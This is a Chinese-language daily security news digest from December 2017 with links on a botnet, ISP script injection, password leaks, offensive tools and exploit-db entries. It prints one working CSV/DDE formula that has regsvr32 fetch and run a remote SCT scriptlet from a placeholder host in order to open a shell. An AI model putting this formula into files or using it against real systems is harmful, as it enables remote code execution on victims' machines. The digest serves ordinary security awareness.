# 12月12日安全热点 - ProxyM僵尸网络/ISP Comcast继续js代码注入

阅读量 **118804**

发布时间 : 2017-12-12 10:57:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t010e95f0791146112c.png)

## 资讯类

14亿明文密码在暗网流通

<https://medium.com/4iqdelvedeep/1-4-billion-clear-text-credentials-discovered-in-a-single-database-3131d0a1ae14>

谷歌员工发布推文

“iOS 11.1.2, now with more kernel debugging”

  
<https://twitter.com/i41nbeer/status/940254977838206976>  
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1417#c3>

ProxyM僵尸网络正作为黑客SQLi, XSS, LFI攻击的中继节点  
（这个僵尸网络从今年2月开始活跃，曾一度感染至10000台设备）  
<https://www.bleepingcomputer.com/news/security/proxym-botnet-used-as-relay-point-for-sqli-xss-lfi-attacks/>

电信运营商Comcast继续向用户访问的网站注入js代码弹框提示用户进行升级  
<https://thenextweb.com/insights/2017/12/11/comcast-continues-to-inject-its-own-code-into-websites-you-visit/>

比特币与门罗币的比较  
（门罗币相对比特币的优点在于：1.不可追踪；2.交易快捷；3.普通电脑就可以挖矿）  
<https://blog.malwarebytes.com/security-world/2017/12/how-cryptocurrency-mining-works-bitcoin-vs-monero/>

## 技术类

[Tools]一行Powershell代码从内存中拿到Wdigest 密码

<https://github.com/giMini/mimiDbg>

[Tools]Invoke-MacroCreator: 用于创建VBA宏的word文档，可执行各种payload的powershell脚本  
<https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator>

[Tools]从Vdex文件反编译和提取Android Dex字节码的工具

<https://github.com/anestisb/vdexExtractor>

[Tools]IDA调试插件for android  
<https://github.com/zhkl0228/AndroidAttacher>

[漏洞]Lenovo OEM-installed crapware comes with a nice Code Execution feature!
Could be used to bypass app whitelisting or privesc (guest account to main
user)  
<http://riscy.business/2017/12/lenovos-unsecured-objects/>

[Tools]Linux内存加密密钥提取工具  
<https://github.com/cryptolok/crykex>

[教程]在Debian 7.5 mipsel Ci20上运行Metasploit  
<https://astr0baby.wordpress.com/2017/12/10/running-metasploit-framework-on-debian-7-5-mipsel-ci20/>

不用powershell.exe，通过.csv文件拿到shell

    
    
    fillerText1,fillerText2,fillerText3,=MSEXCEL|'\..\..\..\Windows\System32\regsvr32 /s /n /u /i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll'!''

<https://twitter.com/G0ldenGunSec/status/939215702073991168>

[漏洞]iOS/macOS – Kernel Double Free due to IOSurfaceRootUserClient not
Respecting MIG Ownership Rules  
<https://www.exploit-db.com/exploits/43320/>

[漏洞]MikroTik 6.40.5 ICMP – Denial of Service  
<https://www.exploit-db.com/exploits/43317/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **77caikiki** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/90176](/post/id/90176)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [每日热点](/tag/每日热点)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t0142708c469a213013.png) 77caikiki

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

